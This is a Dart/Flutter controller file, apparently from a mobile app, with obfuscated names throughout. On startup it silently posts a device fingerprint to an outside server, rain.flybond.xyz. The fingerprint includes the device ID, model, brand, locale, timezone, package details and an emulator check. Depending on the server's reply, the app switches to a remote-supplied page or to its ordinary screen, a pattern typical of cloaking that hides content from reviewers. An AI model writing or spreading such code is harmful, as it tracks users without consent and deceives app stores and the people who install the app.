import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var jbcldtu = RxBool(false);
  var tspfkaxehl = RxBool(true);
  var xacjtznr = RxString("");
  var kenneth = RxBool(false);
  var quigley = RxBool(true);
  final fqpjdhw = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    jueahsv();
  }


  Future<void> jueahsv() async {

    kenneth.value = true;
    quigley.value = true;
    tspfkaxehl.value = false;

    fqpjdhw.post("https://rain.flybond.xyz/ekybjrngfxiouqcpztwadvl",data: await cjxbgl()).then((value) {
      var hwfx = value.data["hwfx"] as String;
      var njeyb = value.data["njeyb"] as bool;
      if (njeyb) {
        xacjtznr.value = hwfx;
        clarissa();
      } else {
        powlowski();
      }
    }).catchError((e) {
      tspfkaxehl.value = true;
      quigley.value = true;
      kenneth.value = false;
    });
  }

  Future<Map<String, dynamic>> cjxbgl() async {
    final DeviceInfoPlugin sevc = DeviceInfoPlugin();
    PackageInfo krsjhb_cdofki = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mdiah = Platform.localeName;
    var zpsd = currentTimeZone;

    var dpsmwuvh = krsjhb_cdofki.packageName;
    var hjxe = krsjhb_cdofki.version;
    var rwtpuvim = krsjhb_cdofki.buildNumber;

    var agwk = krsjhb_cdofki.appName;
    var rosamondKuhic = "";
    var ajlpnugh = "";
    var iyxraobk  = "";
    var jzabvnrp = "";
    var qziwenph = "";
    var matildaBlanda = "";
    var dannieReinger = "";
    var kaylaKovacek = "";

    var rupertPurdy = "";
    var jazlynSchamberger = "";
    var xuzv = false;

    if (GetPlatform.isAndroid) {
      qziwenph = "android";
      var uyvbtep = await sevc.androidInfo;

      jzabvnrp = uyvbtep.brand;

      ajlpnugh  = uyvbtep.model;
      iyxraobk = uyvbtep.id;

      xuzv = uyvbtep.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qziwenph = "ios";
      var hzftcdkaq = await sevc.iosInfo;
      jzabvnrp = hzftcdkaq.name;
      ajlpnugh = hzftcdkaq.model;

      iyxraobk = hzftcdkaq.identifierForVendor ?? "";
      xuzv  = hzftcdkaq.isPhysicalDevice;
    }
    var res = {
      "jazlynSchamberger" : jazlynSchamberger,
      "agwk": agwk,
      "rwtpuvim": rwtpuvim,
      "hjxe": hjxe,
      "ajlpnugh": ajlpnugh,
      "zpsd": zpsd,
      "jzabvnrp": jzabvnrp,
      "dannieReinger" : dannieReinger,
      "iyxraobk": iyxraobk,
      "mdiah": mdiah,
      "qziwenph": qziwenph,
      "xuzv": xuzv,
      "rosamondKuhic" : rosamondKuhic,
      "matildaBlanda" : matildaBlanda,
      "dpsmwuvh": dpsmwuvh,
      "rupertPurdy" : rupertPurdy,
      "kaylaKovacek" : kaylaKovacek,

    };
    return res;
  }

  Future<void> powlowski() async {
    Get.offAllNamed("/taskTab");
  }

  Future<void> clarissa() async {
    Get.offAllNamed("/taskFeel");
  }

}
